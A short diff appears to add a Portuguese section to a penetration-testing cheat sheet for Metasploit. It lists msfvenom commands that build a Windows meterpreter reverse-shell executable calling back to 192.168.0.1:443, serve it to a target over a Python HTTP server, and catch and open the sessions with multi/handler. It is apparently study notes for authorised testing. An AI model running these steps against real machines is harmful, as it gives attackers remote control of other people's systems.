@@ -265,6 +265,42 @@ msf5> `show options`
 msf5> `exploit`
 
 
+## Payloads Executáveis
+
+`msfvenom`
+
+Listando formato de payloads 
+
+`msfvenom -l formats`
+
+Gerando payload para windows
+
+`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.1 lport=443 -f exe -o shellexemplo.exe`
+
+Transferindo arquivo pro alvo
+
+`python -m SimpleHTTPServer 80`
+
+msf5> `use exploit(multi/handler)`
+
+Verificando se as configurações ja foram inseridas
+
+msf5>  `show options`
+
+msf5>  `exploit -j`
+
+msf5>  `jobs`
+
+msf5>  `sessions`
+
+msf5>  `sessions -i 2`
+
+
+## Analisando exploits
+
+
+
+
 
 
 
